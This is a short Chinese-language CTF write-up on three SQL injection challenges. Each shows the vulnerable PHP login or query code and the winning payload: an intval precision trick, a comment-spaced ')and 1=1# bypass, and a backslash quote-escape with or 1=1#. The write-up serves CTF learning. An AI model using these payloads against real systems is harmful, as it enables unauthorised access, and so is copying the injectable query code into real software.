# sql注入做题总结

### 1.CG-CTF:MYSQL
```php
<?php
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```
    wp：精度问题，id=1024.1得到flag
    
### 2.CG-CTF:SQL注入1
```php
if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  if($query[user]=="admin") {
      echo "<p>Logged in! flag:******************** </p>";
  }
  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
echo $query[user];
?>
```
    wp:直接构造and 1 = 1的结构，注意需要替代空格
    user=admin')/**/and/**/1=1#&pass=123
    
### 3.CG-CTF:SQLInjection
```php
<?php
function clean($str){
  if(get_magic_quotes_gpc()){
    $str=stripslashes($str);
  }
  return htmlentities($str, ENT_QUOTES);
}
$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''   .$password.'\';';
?>
```
    wp:clean函数将’和“过滤了所以重点就是将username后面的'转义
    payload为?username=admin \&password=or 1=1#
    这样构造的语句就成了select * from users where name=' admin \' and pass=' or 1=1#';
    也就是把name字段变成了 admin ' and pass=
    整个语句最后理解为select * from users where name=***** or 1=1;
    这样不管查询了什么名称，都是为真的语句。也就是把数据表中的所有数据全部查出
